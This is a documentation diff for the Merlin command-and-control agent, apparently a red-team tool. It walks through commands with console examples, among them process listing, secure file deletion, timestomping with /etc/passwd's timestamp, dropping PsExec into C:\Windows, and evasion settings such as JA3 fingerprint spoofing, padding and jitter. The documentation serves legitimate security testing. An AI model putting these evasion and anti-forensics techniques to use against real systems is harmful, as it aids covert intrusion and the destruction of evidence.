+The ``ps`` command uses the Windows API to gather available information about running processes.
+The agent is not running in a high-integrity process then some of the information will be missing.
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]]» ps
+    [-] Created job afYByFZoXV for agent c1090dbc-f2f7-4d90-a241-86e0c0217786]
+
+    [-] Results job afYByFZoXV for agent c1090dbc-f2f7-4d90-a241-86e0c0217786]
+
+    [+]
+    PID     PPID    ARCH    OWNER   EXE
+    0       0       x64             [System Process]
+    4       0       x64             System
+    124     4       x64             Registry
+    412     4       x64             smss.exe
+    508     496     x64             csrss.exe
+    596     496     x64             wininit.exe
+    604     588     x64             csrss.exe
+    668     588     x64     BUILTIN\Administrators  winlogon.exe
+    736     596     x64             services.exe
+    <SNIP>
+    4648    2504    x64     DESKTOP-H39FR21\bob     sihost.exe
+    5732    736     x64     DESKTOP-H39FR21\bob     svchost.exe
+    5684    736     x64     DESKTOP-H39FR21\bob     svchost.exe
+    5768    1844    x64     DESKTOP-H39FR21\bob     taskhostw.exe
+    5716    736     x64     BUILTIN\Administrators  svchost.exe
+    2396    736     x64     NT AUTHORITY\SYSTEM     svchost.exe
+    6220    2396    x64     DESKTOP-H39FR21\bob     ctfmon.exe
+    6464    736     x64     NT AUTHORITY\LOCAL SERVICE      svchost.exe
+    6504    6376    x64     DESKTOP-H39FR21\bob     explorer.exe
 
 pwd
 ---
@@ -735,107 +1267,49 @@ To correctly issue the command either escape the ``\`` or enclose the commands i
 
     Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run cmd.exe /c dir C:\\Windows\\System32
 
-set
----
+sdelete
+-------
 
-The ``set`` command is used to provide the agent with instructions on controlling itself and/or its configuration. There are several control types to include:
-
-* ja3_
-* killdate_
-* maxretry_
-* padding_
-* skew_
-* sleep_
-
-.. _ja3:
-
-ja3
-^^^
-
-`JA3 is a method for fingerprinting TLS clients on the wire <https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967>`_. Every TLS client has a unique signature depending on its configuration of the following TLS options: ``SSLVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats``.
-
-The ``ja3`` option allows the agent to create a TLS client based on the provided JA3 hash signature. This is useful to evade detections based on a JA3 hash for a known tool (e.g.,. Merlin). `This <https://engineering.salesforce.com/gquic-protocol-analysis-and-fingerprinting-in-zeek-a4178855d75f>`_ article documents a JA3 fingerprint for Merlin. Known JA3 signatures can be downloaded from https://ja3er.com/
-
-.. note::
-    Make sure the input JA3 hash will enable communications with the Server. For example, if you leverage a JA3 hash that only supports SSLv2 and the server does not support that protocol, then they will not be able to communicate. The ``-ja3`` flag will override the the ``-proto`` flag and will cause the agent to use the protocol provided in the JA3 hash.
-
-This example will create a TLS client with a JA3 hash of ``51a7ad14509fd614c7bb3a50c4982b8c`` that matches Java based malware such as Neutrino and Nuclear Exploit Kit (EK).
+The ``sdelete`` command securely deletes a file.
 
 .. code-block:: text
 
-    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set ja3 769,49161-49171-47-49156-49166-51-50-49159-49169-5-49154-49164-49160-49170-10-49155-49165-22-19-4-255,10-11-0,23-1-3-19-21-6-7-9-10-24-11-12-25-13-14-15-16-17-2-18-4-5-20-8-22,0
-    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
-    [-] Created job DWXtIAdjYz for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2020-08-20T14:36:34Z
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sdelete /tmp/deleteMe.txt
+    [-] Created job ZfLruZBwbR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
 
-.. _killdate:
+    [-] Results job ZfLruZBwbR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
 
-killdate
-^^^^^^^^
+    [+] Securely deleted file: /tmp/deleteMe.txt
 
-Killdate is a UNIX timestamp that denotes a time the executable will not run after (if it is 0 it will not be used). Killdate is checked before the agent performs each checkin, including before the initial checkin.
+sessions
+--------
 
-Killdate can be set in the agent/agent.go file before compiling, in the New function instantiation of a new agent. One scenario for using the killdate feature is an agent is persisted as a service and you want it to stop functioning after a certain date, in case the target organization fails to remediate the malicious service. Using killdate here would stop the agent from functioning after a certain specified UNIX system time.
+The ``sessions`` command is used to quickly list information about established agents from the main menu to include their status.
+The sessions command is available from any menu in the CLI.
 
-The Killdate can also be set or changed for running agents using the ``set killdate`` command from the agent menu. This will only modify the killdate for the running agent in memory and will not update the compiled binary file. http://unixtimestamp.50x.eu/ can be used to generate a UNIX timestamp.
-
-A UNIX timestamp of `0` will read like `1970-01-01T00:00:00Z` in the agent info table.
-
-.. code-block:: text
-
-    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set killdate 811123200
-    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job utpISXXXbl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
-
-.. _maxretry:
-
-maxretry
-^^^^^^^^
-
-The ``maxretry`` control type is used to change the _maximum_ number of failed login an agent will allow before the agent quits. For the sake of this conversation, a login means establishing contact with a Merlin Server and receiving no errors. The default is 7. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the ``agent info`` command.
+* AGENT GUID - A unique identifier for every running instance
+* TRANSPORT - The protocol the agent is communicating over
+* PLATFORM - The operating system and architecture the agent is running on
+* HOST - The hostname where the agent is running
+* USER - The username that hte agent is running as
+* PROCESS - The Agent's process name followed by its Process ID (PID) in parenthesis
+* STATUS - The Agent's communiction status of either active, delayed, or dead
+* LAST CHECKIN - The amount of time that has passed since the agent last checked in
+* NOTE - A free-form text area for operators to record notes about a specific agent; tracked server-side only
 
 .. code-block:: text
 
-    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set maxretry 50
-    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job utpISXXXbl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    Merlin» sessions
 
-.. _padding:
-
-padding
-^^^^^^^
-
-The ``padding`` control type is used to change the _maximum_ size of a message's padding. A random value between 0 and the maximum padding value is selected on a per message basis and added to the end of each message. This is used in an attempt to evade detection when a program looks for messages with same size beaconing out. The default is 4096. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the ``agent info`` command.
-
-.. code-block:: text
-
-    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set padding 8192
-    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job wlGTwgtqNx for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
-
-.. _skew:
-
-skew
-^^^^
-
-The ``skew`` command is used to introduce a jitter or skew to the agent sleep time to keep traffic from occurring at exact time intervals.
-
-.. code-block:: text
-
-    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set skew 5
-    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job lyYQdxckTY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
-    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
-
-.. _sleep:
-
-sleep
-^^^^^
-
-The ``sleep`` control type is used to change the amount of time that an agent will sleep before checking in again. The default is 30 seconds. The values provided to this command are written in a time format. For example, ``30s`` is 30 seconds and ``60m`` is 60 minutes. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the ``agent info`` command.
-
-.. code-block:: text
-
-    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set sleep 15s
-    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job npMYqwASOD for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+                   AGENT GUID              |    TRANSPORT    |   PLATFORM    |      HOST       |        USER         |                 PROCESS                  | STATUS | LAST CHECKIN |      NOTE
+    +--------------------------------------+-----------------+---------------+-----------------+---------------------+------------------------------------------+--------+--------------+-----------------+
+      d07edfda-e119-4be2-a20f-918ab701fa3c | HTTP/2 over TLS | linux/amd64   | ubuntu          | rastley             | main(200769)                             | Active | 0:00:08 ago  | Demo Agent Here
 
 sharpgen
 --------
+
+.. note::
+    This command is only available to agent running on a ``Windows`` operating system!
 
 .. warning::
     The .NET Core 2.1 SDK must be manually installed by the operator and the SharpGen executable must be built before the ``sharpgen`` command can be used
@@ -968,6 +1442,32 @@ To correctly issue the command either escape the ``\`` or enclose the commands i
 
     Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell dir C:\\Windows\\System32
 
+.. _skew:
+
+skew
+----
+
+The ``skew`` command is used to introduce a jitter or skew to the agent sleep time to keep traffic from occurring at exact time intervals.
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» skew 5
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
+    [-]Created job lyYQdxckTY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+.. _sleep:
+
+sleep
+-----
+
+The ``sleep`` control type is used to change the amount of time that an agent will sleep before checking in again. The default is 30 seconds. The values provided to this command are written in a time format. For example, ``30s`` is 30 seconds and ``60m`` is 60 minutes. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the ``agent info`` command.
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sleep 15s
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
+    [-]Created job npMYqwASOD for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
 status
 ------
 
@@ -978,6 +1478,32 @@ The ``status`` command is used to simply print if the Merlin Agent is Active, De
     Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» status
     Active
     Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
+
+touch
+-----
+
+The ``touch`` command is used to duplicate a timestamp from one file to another. This technique is also known as timestomp
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell ls -la /tmp/deleteMe.txt
+    [-] Created job hEXYmbbGpW for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job hEXYmbbGpW for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+] -rw-rw-r-- 1 rastley rastley 0 Aug  2 20:11 /tmp/deleteMe.txt
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» touch /etc/passwd /tmp/deleteMe.txt
+    [-] Created job Canvuiuoxj for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job Canvuiuoxj for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+] File: /tmp/deleteMe.txt
+    Last modified and accessed time set to: 2020-09-16 07:05:18.245022776 -0400 EDT
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell ls -la /tmp/deleteMe.txt
+    [-] Created job gTFZbcgeJW for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job gTFZbcgeJW for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+] -rw-rw-r-- 1 rastley rastley 0 Sep 16  2020 /tmp/deleteMe.txt
 
 upload
 ------
@@ -994,3 +1520,20 @@ The ``upload`` command is used to upload a file *from* the Merlin server *to* th
 
     Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» upload C:\\SysinternalsSuite\\PsExec.exe C:\\Windows\\PsExec.exe
     Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job vXJsZdZLPP for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+uptime
+------
+
+.. note::
+    This command is only available to agent running on a ``Windows`` operating system!
+
+The ``uptime`` command uses the Windows API GetTickCount64 method to determine how long the host has been running.
+
+.. code-block:: text
+
+    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» uptime
+    [-] Created job GJwrXttowA for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+    [-] Results job GJwrXttowA for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
+
+    [+]
+    System uptime: 853h31m14.921s
